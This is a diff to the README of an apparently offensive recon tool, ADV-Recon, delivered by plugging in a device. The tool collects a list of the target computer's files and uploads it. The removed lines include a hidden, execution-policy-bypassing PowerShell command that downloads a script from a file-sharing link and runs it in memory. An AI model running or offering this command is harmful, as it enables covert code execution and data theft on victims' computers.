@@ -30,7 +30,6 @@ Along with TREE list of all files in the target computer is gathered and uploade
 
 ### Dependencies
 
-* DropBox or other file sharing service - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -38,10 +37,7 @@ Along with TREE list of all files in the target computer is gathered and uploade
 ### Executing program
 
 * Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
+* Command will be entered in the RunBox to start the ADV-Recon script
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
